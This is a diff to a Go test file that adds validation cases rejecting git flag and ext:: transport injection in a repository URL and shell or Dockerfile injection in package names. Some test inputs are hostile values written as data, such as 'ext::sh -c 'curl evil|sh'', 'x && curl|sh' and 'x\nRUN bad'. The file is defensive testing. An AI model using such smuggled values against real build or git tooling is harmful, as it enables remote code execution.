@@ -86,6 +86,16 @@ func TestValidate(t *testing.T) {
 		{"bad github", func(c *Config) { c.Auth.GitHub = "nope" }, "auth.github"},
 		{"bad repo url", func(c *Config) { c.Repo = "not-a-url" }, "does not look like a git URL"},
 		{"no repo ok", func(c *Config) { c.Repo = "" }, ""},
+		// S4: flag/transport injection via repo URL.
+		{"repo flag injection", func(c *Config) { c.Repo = "--upload-pack=touch x" }, "must not begin with '-'"},
+		{"repo dash scheme", func(c *Config) { c.Repo = "-x://evil" }, "must not begin with '-'"},
+		{"repo ext transport", func(c *Config) { c.Repo = "ext::sh -c 'curl evil|sh'" }, "ext:: transport"},
+		{"repo ext transport with scheme", func(c *Config) { c.Repo = "ext::ssh://x/y" }, "ext:: transport"},
+		// S3: extra_packages command/Dockerfile injection.
+		{"pkg shell metachars", func(c *Config) { c.Image.ExtraPackages = []string{"x && curl|sh"} }, "not a valid package name"},
+		{"pkg newline injection", func(c *Config) { c.Image.ExtraPackages = []string{"x\nRUN bad"} }, "not a valid package name"},
+		{"pkg leading dash", func(c *Config) { c.Image.ExtraPackages = []string{"-rf"} }, "not a valid package name"},
+		{"pkg ok", func(c *Config) { c.Image.ExtraPackages = []string{"poppler-utils", "g++", "lib32z1"} }, ""},
 		{"zero per_run_wall", func(c *Config) { c.Autorun.PerRunWall = 0 }, "per_run_wall"},
 		{"zero max_noprogress", func(c *Config) { c.Autorun.MaxNoProgress = 0 }, "max_noprogress must be > 0"},
 		{"neg cooldown", func(c *Config) { c.Autorun.Cooldown = Duration(-1) }, "cooldown must not be negative"},
